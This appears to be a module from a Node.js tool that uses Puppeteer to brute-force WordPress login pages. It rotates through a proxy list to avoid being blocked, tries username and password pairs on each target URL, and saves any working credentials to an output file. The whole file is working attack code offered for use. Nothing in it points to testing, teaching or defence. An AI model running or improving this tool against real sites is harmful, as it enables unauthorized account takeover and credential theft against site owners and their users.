const fs = require('fs');
const { isWordPressLoginPage } = require('./utils');
const {saveItem} = require('./helpers/outputSaver')
const tryLogin = require('./helpers/login')
const {getProxyParts} = require('./helpers/proxy');
const PuppeteerManager = require('./helpers/puppeteer')

const config = JSON.parse(fs.readFileSync('config.json', 'utf-8'));
const proxies = fs.readFileSync(config.proxy_file, 'utf-8').split('\n').map(p => p.trim());
let proxyIndex = 0;

async function handleLogin(url, logins, password, index) {
	proxyIndex = index % proxies?.length || 0
	for (const login of logins) {
		let puppeteer = new PuppeteerManager;
		let {ip, port, password: proxy_pass, username: proxy_username} = getProxyParts(proxies[proxyIndex % proxies?.length]);
		let browser;
		let page;
		try {
			await puppeteer.launchBrowser(config?.mode == 'with_proxy' ? [`--proxy-server=${ip}:${port}`] : []);
			browser = puppeteer.getBrowser();
			if (!browser) {
				throw console.error('Failed to get browser');
			}
			page = await browser.newPage();
			if (config?.mode == 'with_proxy') {
				await page.authenticate({
					password: proxy_pass,
					username: proxy_username,
				})
			}
			
			await page.goto(url, { waitUntil: 'networkidle2'});
			// Add cookies
			const isWordPress = await isWordPressLoginPage(page);
			if (!isWordPress) {
				console.log(`URL: ${url}, Error: Not a WordPress login page`);
				break;
			}
			
			const result = await tryLogin(page, login, password);
			if (result == 'good') {
				await saveItem({url, login, password})
				console.log(`\n--- * --- * --- * ---\n`);
				console.log(`Result is ${result}. URL: ${url}, login: ${login}, password: ${password}`);
				console.log(`\n--- * --- * --- * ---\n`);
			} else {
				console.log(`\n--- * --- * --- * ---\n`);
				console.log(`URL: ${url}, Result is ${result}.`);
				console.log(`\n--- * --- * --- * ---\n`);
			}
		} catch (error) {
			console.error('Error while trying to login', error?.message);
		} finally {
			if (config.mode == 'with_proxy' && config?.proxy_mode == 'iteration') proxyIndex++;
			if (page) await page.close();
			if (puppeteer) await puppeteer.closeBrowser();
		}
	}
}

module.exports = { handleLogin };